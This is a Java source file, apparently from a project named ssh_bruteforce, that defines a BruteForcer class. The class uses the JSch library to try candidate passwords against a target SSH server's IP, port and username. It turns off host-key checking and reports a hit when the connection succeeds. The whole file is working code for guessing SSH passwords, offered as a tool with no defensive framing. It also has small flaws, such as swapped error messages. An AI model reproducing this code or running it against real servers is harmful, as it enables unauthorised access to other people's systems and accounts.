package com.github.lfbr0.ssh_bruteforce.ssh;

import com.github.lfbr0.ssh_bruteforce.ArgumentsParser;
import com.github.lfbr0.ssh_bruteforce.exceptions.ArgumentsException;
import com.jcraft.jsch.JSch;
import com.jcraft.jsch.JSchException;
import com.jcraft.jsch.Session;

import java.util.Optional;

/**
 * Class responsible for bruteforcing.
 */
public class BruteForcer {


    private final Optional<String> ipAddress; //target ip addr
    private final Optional<String> port; //target port
    private final Optional<String> username; //target user
    private Optional<Session> session; //session wrapper

    private final int TIMEOUT_MS = 30000; //timeout value in MS to avoid being booted out

    public BruteForcer(ArgumentsParser argsParser) {

        this.ipAddress = argsParser.getIPAddress();
        this.port = argsParser.getPort();
        this.username = argsParser.getUsername();
        this.session = Optional.empty();

    }

    /**
     * Tries to connect and returns if the password passed was a hit
     * @param password -> pass to attempt
     * @return true if password is a hit
     * @throws ArgumentsException if invalid arguments present
     */
    public boolean attempt(String password) throws ArgumentsException {

        //if empty, create a new session
        try {
            session = Optional.of(
                    //optional methods incoming...
                    new JSch().getSession(
                            username.orElseThrow(
                                    () -> new ArgumentsException("No IP address passed in arguments")
                            ),
                            ipAddress.orElseThrow(
                                    () -> new ArgumentsException("No username passed in arguments")
                            ),
                            port.or( () -> Optional.of("22") )
                                    .map(Integer::parseInt)
                                    .get()
                    )
            );
        } catch (JSchException e) {
            throw new ArgumentsException(e.getMessage());
        }

        //set password to the one we want to try
        session.get().setPassword(password);
        session.get().setConfig("StrictHostKeyChecking", "no");

        try { //to connect...

            session.get().connect(TIMEOUT_MS);
            session.get().connect();
            session.get().disconnect();
            return true;

        } catch (JSchException e) {
            //if we know that the session is already opened, then we have the right password
            return e.getMessage().equalsIgnoreCase("session is already connected");
        }

    }

}
